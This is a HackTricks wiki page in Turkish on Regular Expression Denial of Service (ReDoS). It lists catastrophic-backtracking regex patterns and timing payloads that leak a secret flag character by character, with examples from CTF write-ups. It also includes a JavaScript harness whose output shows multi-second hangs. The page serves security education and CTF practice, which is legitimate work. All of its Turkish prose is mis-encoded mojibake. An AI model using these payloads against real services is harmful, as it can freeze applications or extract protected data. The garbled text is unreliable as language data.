# Regular expression Denial of Service - ReDoS

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

# Regular Expression Denial of Service (ReDoS)

Bir **Regular Expression Denial of Service (ReDoS)**, birinin dÃ¼zenli ifadelerin (metin iÃ§inde desenleri arama ve eÅŸleÅŸtirme yÃ¶ntemi) nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndaki zayÄ±flÄ±klarÄ± kullanmasÄ± durumunda meydana gelir. Bazen, dÃ¼zenli ifadeler kullanÄ±ldÄ±ÄŸÄ±nda, Ã¶zellikle Ã¼zerinde Ã§alÄ±ÅŸtÄ±klarÄ± metin parÃ§asÄ± bÃ¼yÃ¼dÃ¼ÄŸÃ¼nde Ã§ok yavaÅŸ hale gelebilirler. Bu yavaÅŸlÄ±k, metin boyutundaki kÃ¼Ã§Ã¼k artÄ±ÅŸlarla bile Ã§ok hÄ±zlÄ± bir ÅŸekilde kÃ¶tÃ¼leÅŸebilir. SaldÄ±rganlar, bu sorunu kullanarak dÃ¼zenli ifadeleri kullanan bir programÄ±n uzun sÃ¼re dÃ¼zgÃ¼n Ã§alÄ±ÅŸmasÄ±nÄ± engelleyebilirler.

## Problemli Regex NaÃ¯ve AlgoritmasÄ±

**DetaylarÄ± kontrol edin [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**

## KÃ¶tÃ¼ Regexler <a href="#evil-regexes" id="evil-regexes"></a>

KÃ¶tÃ¼ bir dÃ¼zenli ifade deseni, **Ã¶zel olarak hazÄ±rlanmÄ±ÅŸ girdi Ã¼zerinde takÄ±lÄ± kalabilen** bir desendir. KÃ¶tÃ¼ regex desenleri genellikle tekrar ve tekrar ile gruplama iÃ§erir veya tekrar eden grupta Ã¶rtÃ¼ÅŸme ile alternatiflik iÃ§erir. KÃ¶tÃ¼ desenlere bazÄ± Ã¶rnekler ÅŸunlardÄ±r:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} for x > 10

BunlarÄ±n hepsi `aaaaaaaaaaaaaaaaaaaaaaaa!` girdisine karÅŸÄ± savunmasÄ±zdÄ±r.

## ReDoS Payload'larÄ±

### ReDoS ile Dize SÄ±zdÄ±rma

Bir CTF'de (veya hata Ã¶dÃ¼lÃ¼) belki de **Regex'in eÅŸleÅŸtiÄŸi hassas bir bilgiyi (bayraÄŸÄ±) kontrol ediyorsunuzdur**. O zaman, **Regex eÅŸleÅŸtiÄŸinde (zaman aÅŸÄ±mÄ± veya daha uzun iÅŸleme sÃ¼resi)** sayfanÄ±n **donmasÄ±nÄ± saÄŸlamak** faydalÄ± olabilir ve **eÅŸleÅŸmediÄŸinde deÄŸil**. Bu ÅŸekilde, dizeyi **karakter karakter** **sÄ±zdÄ±rabilirsiniz**:

* [**bu yazÄ±da**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) bu ReDoS kuralÄ±nÄ± bulabilirsiniz: `^(?=<flag>)((.*)*)*salt$`
* Ã–rnek: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* [**bu yazÄ±mda**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) bu Ã¶rneÄŸi bulabilirsiniz: `<flag>(((((((.*)*)*)*)*)*)*)!`
* [**bu yazÄ±mda**](https://ctftime.org/writeup/25869) ÅŸunu kullandÄ±: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoS Girdi ve Regex KontrolÃ¼

AÅŸaÄŸÄ±dakiler, **girdiyi** ve **regex'i** **kontrol ettiÄŸiniz** **ReDoS** Ã¶rnekleridir:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## AraÃ§lar

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## Referanslar
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
